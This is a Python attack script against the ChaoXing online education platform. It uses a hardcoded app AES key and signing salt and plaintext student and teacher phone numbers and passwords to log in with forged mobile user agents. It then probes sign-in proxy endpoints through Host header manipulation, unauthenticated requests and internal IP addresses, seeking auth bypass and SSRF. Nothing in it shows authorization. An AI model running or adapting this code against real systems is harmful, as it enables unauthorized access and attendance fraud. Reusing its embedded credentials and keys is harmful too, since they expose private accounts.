#!/usr/bin/env python3
"""
Tier 8 - Phase 4: Host Header Routing Exploitation
CRITICAL FINDING: Host header manipulation causes 500 errors on proxy paths
This means the proxy IS routing based on Host header - potential SSRF/auth bypass
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
ACTIVE_ID = "5000163891319"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def req_raw(session, url, method="GET", params=None, data=None, headers_extra=None, follow=False, timeout=15):
    try:
        h = dict(session.headers)
        if headers_extra:
            h.update(headers_extra)
        if method == "GET":
            r = session.get(url, params=params, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
        elif method == "POST":
            r = session.post(url, data=data, params=params, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
        elif method == "OPTIONS":
            r = session.options(url, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
        return r.status_code, r.text[:3000], dict(r.headers)
    except Exception as e:
        return f"ERROR: {str(e)[:100]}", "", {}

def main():
    print("=" * 80)
    print("TIER 8 Phase 4: Host Header Routing Exploitation")
    print("CRITICAL: Host header manipulation causes 500 on proxy paths")
    print("=" * 80)

    print("\n[*] Logging in...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    Student PUID: {stu_puid}")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    Teacher PUID: {tea_puid}")

    noauth = requests.Session()
    noauth.verify = False
    noauth.headers.update({"User-Agent": get_mobile_ua()})

    sign_params = {"activeId": ACTIVE_ID, "uid": stu_puid, "courseId": COURSE_ID, "classId": CLASS_ID, "signType": "0", "clientType": "1"}

    # ========================================
    # TEST 1: Detailed Host header analysis
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 1: Host Header - Full 500 Response Analysis")
    print("=" * 80)

    url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"

    # Test with mooc1-api Host header
    status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                  headers_extra={"Host": "mooc1-api.chaoxing.com"})
    print(f"\n  Host: mooc1-api.chaoxing.com => {status}")
    print(f"  Headers: {json.dumps(hdrs, indent=2)}")
    print(f"  Full body:\n{text}")

    # ========================================
    # TEST 2: Host header with different target services
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 2: Host Header with Different Target Services")
    print("=" * 80)

    host_targets = [
        # Sign-in related services
        "mooc1-api.chaoxing.com",
        "mooc1-1.chaoxing.com",
        "mooc1-2.chaoxing.com",
        "mooc1.chaoxing.com",
        # Other ChaoXing services
        "i.chaoxing.com",
        "passport2.chaoxing.com",
        "mooc1-ans.chaoxing.com",
        "fystat-ans.chaoxing.com",
        # Internal-looking services
        "note-api.chaoxing.com",
        "sign-api.chaoxing.com",
        "api.chaoxing.com",
        "mobile.chaoxing.com",
        "m.chaoxing.com",
    ]

    for host in host_targets:
        url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"
        status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                      headers_extra={"Host": host})
        print(f"  Host: {host} => {status}")
        if str(status) not in ("405", "500"):
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 3: Host header on comm path
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 3: Host Header on /comm Path")
    print("=" * 80)

    for host in host_targets[:6]:
        url = "https://noteyd.chaoxing.com/comm/pptSign/updateSignStatus"
        status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                      headers_extra={"Host": host})
        print(f"  Host: {host} => {status}")
        if str(status) not in ("405", "500"):
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 4: Host header on appswh paths
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 4: Host Header on appswh Paths")
    print("=" * 80)

    appswh_paths = [
        "https://appswh.chaoxing.com/epub/pptSign/updateSignStatus",
        "https://appswh.chaoxing.com/projectapp/pptSign/updateSignStatus",
        "https://appswh.chaoxing.com/hbqyg/pptSign/updateSignStatus",
    ]

    for base_url in appswh_paths:
        print(f"\n  --- {base_url} ---")
        for host in ["mooc1-api.chaoxing.com", "mooc1-1.chaoxing.com", "i.chaoxing.com"]:
            status, text, hdrs = req_raw(stu_session, base_url, method="POST", data=sign_params,
                                          headers_extra={"Host": host})
            print(f"    Host: {host} => {status}")
            if str(status) not in ("405", "500"):
                print(f"      Body: {text[:200]}")

    # ========================================
    # TEST 5: Host header with GET method
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 5: Host Header with GET Method on Proxy Paths")
    print("=" * 80)

    for host in ["mooc1-api.chaoxing.com", "mooc1-1.chaoxing.com"]:
        url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"
        status, text, hdrs = req_raw(stu_session, url, method="GET",
                                      params=sign_params,
                                      headers_extra={"Host": host})
        print(f"  GET Host: {host} => {status}")
        if str(status) not in ("404", "500"):
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 6: Host header on proxy root path
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 6: Host Header on Proxy Root Path")
    print("=" * 80)

    for host in host_targets[:6]:
        url = "https://noteyd.chaoxing.com/proxy/"
        status, text, hdrs = req_raw(stu_session, url, method="GET",
                                      headers_extra={"Host": host})
        print(f"  GET /proxy/ Host: {host} => {status}")
        if str(status) not in ("400", "500"):
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 7: No auth with Host header manipulation
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 7: No Auth + Host Header Manipulation (Auth Bypass Test)")
    print("=" * 80)

    for host in ["mooc1-api.chaoxing.com", "mooc1-1.chaoxing.com", "i.chaoxing.com"]:
        url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"
        # No auth session
        status, text, hdrs = req_raw(noauth, url, method="POST", data=sign_params,
                                      headers_extra={"Host": host})
        print(f"  [NoAuth] Host: {host} => {status}")
        if str(status) not in ("405", "500"):
            print(f"    Body: {text[:200]}")

        # Compare with student auth
        status2, text2, hdrs2 = req_raw(stu_session, url, method="POST", data=sign_params,
                                         headers_extra={"Host": host})
        if text != text2:
            print(f"  *** DIFFERENT response between NoAuth and Student!")
            print(f"    NoAuth: {text[:100]}")
            print(f"    Student: {text2[:100]}")

    # ========================================
    # TEST 8: Try different sign-in API paths with Host header
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 8: Different Sign-in API Paths with Host Header")
    print("=" * 80)

    api_paths = [
        "pptSign/updateSignStatus",
        "pptSign/stuSignajax",
        "newsign/updateSignStatus",
        "pptSign/refeashSignList4Json2",
        "mooc-ans/pptSign/updateSignStatus",
        "mooc-ans/api/pptSign/updateSignStatus",
    ]

    for api_path in api_paths:
        url = f"https://noteyd.chaoxing.com/proxy/{api_path}"
        for host in ["mooc1-api.chaoxing.com", "mooc1-1.chaoxing.com"]:
            status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                          headers_extra={"Host": host})
            print(f"  Host: {host} /{api_path} => {status}")
            if str(status) not in ("405", "500", "404"):
                print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 9: Direct API access with noteyd cookies
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 9: Direct API Access with noteyd Cookies (Cross-Domain Auth)")
    print("=" * 80)

    # After login, student session has cookies for chaoxing.com
    # Test if these cookies work on direct sign-in APIs
    direct_urls = [
        "https://mooc1-api.chaoxing.com/pptSign/updateSignStatus",
        "https://mooc1-1.chaoxing.com/pptSign/updateSignStatus",
        "https://mooc1-2.chaoxing.com/pptSign/updateSignStatus",
    ]

    for direct_url in direct_urls:
        status, text, hdrs = req_raw(stu_session, direct_url, method="POST", data=sign_params)
        print(f"  [Direct+Auth] {direct_url} => {status}")
        if text:
            print(f"    Body: {text[:200]}")

        # Also try with the correct mooc1-api path
        correct_url = direct_url.replace("/pptSign/updateSignStatus", "/mooc-ans/pptSign/updateSignStatus")
        status, text, hdrs = req_raw(stu_session, correct_url, method="POST", data=sign_params)
        print(f"  [Direct+Auth+mooc-ans] {correct_url} => {status}")
        if text:
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 10: Analyze the 500 response in detail
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 10: Full 500 Response Analysis")
    print("=" * 80)

    url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"
    status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                  headers_extra={"Host": "mooc1-api.chaoxing.com"})
    print(f"  Status: {status}")
    print(f"  Headers: {json.dumps(hdrs, indent=2)}")
    print(f"  Full body:\n{text}")

    # ========================================
    # TEST 11: Try Host header with internal IPs
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 11: Host Header with Internal IPs (SSRF Test)")
    print("=" * 80)

    internal_hosts = [
        "127.0.0.1",
        "localhost",
        "10.0.0.1",
        "192.168.1.1",
        "172.16.0.1",
        "0.0.0.0",
    ]

    for host in internal_hosts:
        url = "https://noteyd.chaoxing.com/proxy/pptSign/updateSignStatus"
        status, text, hdrs = req_raw(stu_session, url, method="POST", data=sign_params,
                                      headers_extra={"Host": host})
        print(f"  Host: {host} => {status}")
        if str(status) not in ("500", "405"):
            print(f"    Body: {text[:200]}")

    print("\n" + "=" * 80)
    print("PHASE 4 COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
